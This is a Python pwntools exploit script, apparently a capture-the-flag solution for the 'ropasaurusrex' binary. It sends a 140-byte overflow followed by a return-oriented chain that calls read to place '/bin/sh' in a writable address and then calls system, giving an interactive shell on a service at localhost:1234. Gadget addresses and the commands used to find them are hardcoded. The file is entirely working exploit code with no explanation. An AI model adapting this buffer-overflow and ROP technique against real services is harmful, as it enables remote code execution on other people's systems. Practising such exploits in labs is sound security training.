from pwn import *
from Rop import RopChain

cmd = "/bin/sh\n"
overflow = "a" * 140

########GADGETS#########

#obdjump -x ropasaurusrex
storage = 0x8049530
#objdump -D ropasaurusrex | grep read
read_addr= 0x804832c
#in gdb: x system
sys_addr = 0xf7e30eb0
#objdump -D ropasaurusrex | egrep "pop|ret"
pppr = 0x80484b6
#######################

ropChain = RopChain()
ropChain.addPopRet(3,pppr)
ropChain.addLink(read_addr,[0,storage,len(cmd)])
ropChain.addLink(sys_addr,storage)

payload = overflow + ropChain.getChain()

conn = remote('localhost', 1234)

print "sending payload..."
conn.sendline(payload)
print "writing command to memory..."
conn.sendline(cmd)
print "getting shell..."
conn.interactive()
